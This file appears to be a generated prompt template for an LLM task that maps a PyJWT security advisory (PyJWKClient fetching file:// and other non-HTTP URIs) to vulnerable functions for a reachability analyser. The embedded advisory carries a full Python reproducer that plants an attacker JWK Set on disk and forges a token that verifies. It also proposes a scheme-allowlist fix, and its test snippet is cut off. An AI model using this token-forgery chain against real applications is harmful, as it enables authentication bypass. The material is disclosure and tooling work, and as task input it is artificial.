@@ -1,0 +1,156 @@
+You convert advisory prose into function-level sinks for a static reachability analyser.
+
+Mode: advisory+patch
+You get the advisory text and the Python hunks of the linked fix commit below.
+
+Advisory GHSA-993g-76c3-p5m4 (CVE-2026-48522, GHSA-993g-76c3-p5m4, PYSEC-2026-175)
+Package: pyjwt 2.4.0
+Fixed in: 2.13.0
+Severity: moderate
+
+Summary: PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes
+
+Details:
+> [!NOTE]
+> The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.
+
+## Summary
+
+PyJWKClient passes its `uri` argument directly to `urllib.request.urlopen()` which uses Python stdlib's default `OpenerDirector` registering `HTTPHandler`, `HTTPSHandler`, `FTPHandler`, **`FileHandler`**, and `DataHandler`. There is currently no documented option to restrict which schemes PyJWKClient will fetch.
+
+If an application's `jku` URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:
+
+1. Cause PyJWKClient to read arbitrary local files via `file://` (SSRF on local filesystem) — the file's contents are passed to `json.load`.
+2. Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface).
+3. **Forge tokens that PyJWT verifies as valid** — if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and `jwt.decode()` accepts.
+
+## Affected versions
+
+Tested and reproducible on **PyJWT 2.11.0 and 2.12.1**. Likely all versions back to PyJWKClient introduction.
+
+## Reproducer (full attack chain — verified empirically)
+
+```python
+import jwt as pyjwt
+from jwt import PyJWKClient
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+import json, base64, time
+
+# Attacker generates keypair (no relation to real IdP)
+key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+pub_n = key.public_key().public_numbers().n
+
+def b64u(n):
+    bl = (n.bit_length() + 7) // 8
+    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()
+
+# Attacker writes JWK Set containing their public key to /tmp
+jwks = {"keys":[{"kty":"RSA","kid":"attacker","use":"sig","alg":"RS256",
+                  "n":b64u(pub_n),"e":"AQAB"}]}
+with open("/tmp/attacker.json","w") as f:
+    json.dump(jwks, f)
+
+# Attacker mints token signed with their private key, jku=file://
+priv_pem = key.private_bytes(serialization.Encoding.PEM,
+    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
+now = int(time.time())
+token = pyjwt.encode(
+    {"sub":"attacker","aud":"target-app","iat":now,"exp":now+3600},
+    priv_pem, algorithm="RS256",
+    headers={"kid":"attacker","jku":"file:///tmp/attacker.json","typ":"JWT"})
+
+# Vulnerable application pattern: caller derives jku from token header
+# and passes to PyJWKClient without scheme validation
+header = pyjwt.get_unverified_header(token)
+client = PyJWKClient(header["jku"])      # <-- accepts file:// silently
+key_obj = client.get_signing_key_from_jwt(token)
+decoded = pyjwt.decode(token, key_obj.key, algorithms=["RS256"],
+                       audience="target-app")
+print("Token verified:", decoded)
+# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}
+```
+
+## Cross-library evidence — PyJWT is the outlier
+
+The same composition pattern is structurally safe in 4 other mainstream JWT libraries:
+
+| Library | Behavior on `jku=file://...` | Mechanism |
+|---|---|---|
+| **PyJWT 2.12.1** (Python) | **Reads file from disk, parses, uses for signature verification** | urllib default OpenerDirector includes FileHandler |
+| panva/jose 6.2.3 (Node.js) | Refuses pre-fetch | WHATWG `fetch()` rejects non-http(s) at fetch-spec layer |
+| golang-jwt + MicahParks/keyfunc v3.4.0 (Go) | Refuses pre-fetch | `http.DefaultTransport` only registers http/https |
+| Microsoft.IdentityModel.Tokens 8.18.0 (.NET) | Refuses pre-fetch | `HttpDocumentRetriever` defaults `RequireHttps=true` |
+| Spring Security NimbusJwtDecoder 6.3.4 (Java) | Refuses pre-fetch | URI parser delegation refuses non-http(s) at request build |
+
+PyJWT is the only library of these 5 where the default behavior allows `file://` to reach the fetch layer.
+
+## Recommended fix
+
+Add `allowed_schemes: tuple[str, ...] = ("https", "http")` kwarg to `PyJWKClient.__init__`. Pre-validate URL scheme before invoking `urllib.request.urlopen`. URLs with disallowed schemes raise `PyJWKClientError` before any fetch is attempted.
+
+### Diff sketch against `jwt/jwks_client.py`
+
+```python
+def __init__(
+    self, uri: str,
+    cache_keys: bool = False, max_cached_keys: int = 16,
+    cache_jwk_set: bool = True, lifespan: float = 300,
+    headers: dict[str, Any] | None = None, timeout: float = 30,
+    ssl_context: SSLContext | None = None,
+    allowed_schemes: tuple[str, ...] = ("https", "http"),  # NEW
+):
+    """...
+    :param allowed_schemes: URL schemes the JWKS endpoint is permitted
+        to use. Default ``("https", "http")``. Pass ``("https",)`` for
+        HTTPS-only operation. URLs with disallowed schemes raise
+        ``PyJWKClientError`` before any fetch is attempted.
+    """
+    # ... existing init code ...
+    self.allowed_schemes = allowed_schemes
+    self._validate_uri_scheme()
+
+
+def _validate_uri_scheme(self) -> None:
+    """Reject the configured URI early if its scheme isn't allowed."""
+    from urllib.parse import urlparse
+    parsed = urlparse(self.uri)
+    scheme = parsed.scheme.lower()
+    if not scheme:
+        raise PyJWKClientError(
+            f"PyJWKClient URI '{self.uri}' has no scheme; expected one of "
+            f"{self.allowed_schemes!r}")
+    if scheme not in self.allowed_schemes:
+        raise PyJWKClientError(
+            f"PyJWKClient URI scheme '{scheme}' is not in allowed_schemes "
+            f"{self.allowed_schemes!r}; refusing to fetch from this URL")
+```
+
+### Tests to add
+
+```python
+def test_pyjwkclient_rejects_file_scheme():
+    with pytest.raises(PyJWKClientError, match="not in allowed_schemes"):
+        PyJWKClient(
+
+References:
+- WEB: https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4
+- ADVISORY: https://nvd.nist.gov/vuln/detail/CVE-2026-48522
+- WEB: https://github.com/github/advisory-database/pull/8521
+- PACKAGE: https://github.com/jpadilla/pyjwt
+- WEB: https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml
+
+(no fix commit is linked from this advisory)
+
+
+Return exactly this JSON object and nothing else:
+
+{"advisory": "GHSA-993g-76c3-p5m4", "package": "pyjwt", "sinks": ["pkg.module.Class.method"],
+ "confidence": "high|medium|low", "evidence": "...", "assumptions": ["..."], "mode": "advisory+patch"}
+
+Rules:
+- Fully qualified identifiers only. A bare function name is not an answer.
+- Name the function that contains the flaw, not the public API a user calls, unless they are the same.
+- sinks may be empty. An empty list with an honest assumption beats a guess.
+- confidence is high only when the advisory or the patch names the function.
+- Put every inference that could be wrong in assumptions. A verifier checks them against the patch diff.
